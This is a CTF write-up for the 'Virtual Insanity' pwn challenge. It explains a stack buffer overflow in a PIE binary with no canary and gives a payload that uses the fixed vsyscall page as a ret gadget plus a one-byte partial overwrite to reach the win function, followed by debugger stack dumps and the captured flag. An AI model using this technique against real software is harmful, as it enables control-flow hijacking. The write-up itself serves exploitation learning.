# Virtual Insanity - 19 solves

```
Dancing, Walking, Rearranging Furniture

DISCLAIMER: This challenge doesn't require brute-forcing

nc virtual.ctf.theromanxpl0.it 7011
```

We are given a binary with almost full protections, lacking stack canary. A win function is used to print the flag.

```c
000011a9    int64_t win()

000011a9    {
000011a9        puts("IMPOSSIBLE! GRAHHHHHHHHHH");
000011d9        return puts(getenv("FLAG"));
000011a9    }


000011da    int32_t main(int32_t argc, char** argv, char** envp)

000011da    {
000011da        setvbuf(stdin, nullptr, 2, 0);
0000121d        setvbuf(__TMC_END__, nullptr, 2, 0);
0000122c        puts("You pathetic pwners are worthles…");
00001242        void buf; // -0x28 stack offset
00001242        read(0, &buf, 0x50);
0000124d        return 0;
000011da    }
```

```bash
[*] '/home/kali/Desktop/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This seems like a simple *ret2win* challenge, however it gets complicated due to the fact that there is no way to leak the base address. 

Let's put a breakpoint on main's `ret` and see how the stack looks:

```c
pwndbg> stack
00:0000│ rsp 0x7fffffffdcb8 —▸ 0x7ffff7ddbd68 (__libc_start_call_main+120) ◂— mov edi, eax
01:0008│     0x7fffffffdcc0 —▸ 0x7fffffffddb0 —▸ 0x7fffffffddb8 ◂— 0x38 /* '8' */
02:0010│     0x7fffffffdcc8 —▸ 0x5555555551da (main) ◂— endbr64 
03:0018│     0x7fffffffdcd0 ◂— 0x155554040
04:0020│     0x7fffffffdcd8 —▸ 0x7fffffffddc8 —▸ 0x7fffffffe14b ◂— '/home/kali/Desktop/chall'
05:0028│     0x7fffffffdce0 —▸ 0x7fffffffddc8 —▸ 0x7fffffffe14b ◂— '/home/kali/Desktop/chall'
06:0030│     0x7fffffffdce8 ◂— 0x2a47d40ba481b7d5
07:0038│     0x7fffffffdcf0 ◂— 0
```

Since at `rsp + 0x10` is the address of the `main` function, a partial overwrite is easy. The problem is that we need to find a `ret` gadget.

But how can we find a `ret` gadget if PIE is enabled? 

 > By using **vsyscalls** - virtualized system call interfaces in Linux that speed up certain kernel operations by avoiding unnecessary context switches.

This was the tricky part of the challenge - realizing that **vsyscalls** are enabled/emulated on remote.

**vsyscalls** are always at a fixed memory address:

```c
0xffffffffff600000 0xffffffffff601000 r-xp     1000      0 [vsyscall]
```

```c
0xffffffffff600000:  mov rax, 0x60
0xffffffffff600007:  syscall
0xffffffffff600009:  ret
```

So we found our `ret` gadget!

Now, we can use this payload to return back to the `main` function:

```python
payload = b"A" * 0x28
payload += p64(0xffffffffff600000) * 2
```

And partially overwrite the `main` function address to return to the `win` function:

```python
payload += b"\xa9"
```

The stack looks like this now:

```c
pwndbg> stack
00:0000│ rsp 0x7ffe84682bf8 ◂— 0xffffffffff600000
01:0008│     0x7ffe84682c00 ◂— 0xffffffffff600000
02:0010│     0x7ffe84682c08 —▸ 0x55594dc0d1a9 (win) ◂— endbr64 
03:0018│     0x7ffe84682c10 ◂— 0x14dc0c040
04:0020│     0x7ffe84682c18 —▸ 0x7ffe84682d08 —▸ 0x7ffe84682faf ◂— '/home/kali/Desktop/chall'
05:0028│     0x7ffe84682c20 —▸ 0x7ffe84682d08 —▸ 0x7ffe84682faf ◂— '/home/kali/Desktop/chall'
06:0030│     0x7ffe84682c28 ◂— 0x7c667b6242fc42e6
07:0038│     0x7ffe84682c30 ◂— 0
```

---

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ./solve.py REMOTE
IMPOSSIBLE! GRAHHHHHHHHHH
TRX{1_h0p3_y0u_d1dn7_bru73f0rc3_dc85efe0}
$  
```

---
## Full exploit code in `solve.py`

---

* During the CTF, the creator of the challenge specified that the intended solution isn't "dependant on the libc version".